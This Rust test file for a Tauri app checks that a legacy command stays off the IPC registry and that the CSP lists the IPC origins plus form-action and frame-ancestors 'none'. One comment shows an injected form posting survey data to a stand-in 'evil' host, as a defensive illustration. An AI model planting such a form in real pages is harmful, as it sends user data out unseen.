//! App-surface contract tests relocated next to the wiring they pin, ahead of
//! the crate split: the IPC command registry (`generate_handler![]` in
//! `lib.rs`, read through its generated manifest) and `tauri.conf.json` stay
//! with the app crate, so the tests that read them live here too.

/// Every command `generate_handler![]` registers, from the manifest
/// `pnpm gen:ipc-types` writes (#576 C3) - parsed out of `lib.rs` with `syn`
/// and kept fresh by CI's generated-types gate - instead of a text scan of
/// `lib.rs` here.
fn registered_commands() -> Vec<String> {
    let manifest: serde_json::Value =
        serde_json::from_str(include_str!("../../../src/types/ipc/ipcCommands.json"))
            .expect("ipcCommands.json is the generator's JSON");
    let names: Vec<String> = manifest["commands"]
        .as_array()
        .expect("the manifest lists commands")
        .iter()
        .map(|c| {
            c["name"]
                .as_str()
                .expect("every command has a name")
                .to_owned()
        })
        .collect();
    assert!(
        names.len() > 100,
        "the manifest lists only {} commands",
        names.len()
    );
    names
}

#[test]
fn the_legacy_open_project_is_not_exposed_over_ipc() {
    // `AppState::open_project` deliberately has NO canonical-storage guard
    // (see its doc comment): its one production caller reopens the canonical
    // cache path after a failed replace. That is only sound while the webview
    // cannot reach it, so pin its absence from the command registry.
    assert!(
        !registered_commands()
            .iter()
            .any(|name| name == "open_project"),
        "open_project gained an IPC registration - it must now run the \
         canonical-storage guard (see AppState::open_project's doc comment)"
    );
}

/// `connect-src` in BOTH policies must admit Tauri's own IPC origin.
///
/// Every `invoke` is a `fetch` to `ipc://localhost/<cmd>` (macOS/Linux) or
/// `http://ipc.localhost/<cmd>` (Windows) - see `ipc-protocol.js` in the `tauri`
/// crate - so `connect-src` governs it, and Tauri does NOT add the origin back:
/// `set_csp` merges only script/style hashes, and its one automatic `default-src`
/// addition is gated on the isolation pattern, which this app does not use.
///
/// Omitting it does not brick the app, which is exactly why this needs a test:
/// the failure is silent. Tauri catches the CSP rejection, warns once to a
/// console nobody reads in a packaged build, latches `customProtocolIpcFailed`
/// and falls back to `postMessage` for the rest of the session - losing the
/// binary response path for every IPC reply. Nothing else in this repo can catch
/// it: `tauri.conf.json` has no linter, and the production `csp` (as opposed to
/// `devCsp`) is not exercised by the dev server, Playwright, or vitest - only by
/// a real `tauri build`.
#[test]
fn test_csp_allows_the_tauri_ipc_origin() {
    let conf_path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tauri.conf.json");
    let conf: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&conf_path).unwrap()).unwrap();

    let security = &conf["app"]["security"];
    for key in ["csp", "devCsp"] {
        // `assert!` rather than `unwrap_or_else(|| panic!(..))`: `clippy::panic`
        // is deny-level here, and this module's `#[expect]` (commands/mod.rs)
        // covers `unwrap`/`expect` but deliberately not `panic!`.
        let policy = security[key].as_str();
        assert!(policy.is_some(), "app.security.{key} must be a string");
        let policy = policy.unwrap();

        let connect_src = policy
            .split(';')
            .map(str::trim)
            .find(|directive| directive.starts_with("connect-src"));
        assert!(connect_src.is_some(), "{key} must declare connect-src");
        let connect_src = connect_src.unwrap();

        for origin in ["ipc:", "http://ipc.localhost"] {
            assert!(
                connect_src.split_whitespace().any(|src| src == origin),
                "{key}'s connect-src must list `{origin}` or every invoke falls \
                 back to the slower postMessage transport; got: {connect_src}"
            );
        }

        // `form-action` and `frame-ancestors` have NO `default-src` fallback in
        // CSP3, so a tight `connect-src` is not the exfil control it looks like:
        // an injected `<form method=POST action=https://evil/>` posts survey data
        // straight past it. Neither directive can break a Tauri app, so there is
        // no reason for either to be absent.
        for directive in ["form-action 'none'", "frame-ancestors 'none'"] {
            assert!(
                policy.split(';').map(str::trim).any(|d| d == directive),
                "{key} must declare `{directive}` - it does not fall back to \
                 default-src; got: {policy}"
            );
        }
    }
}
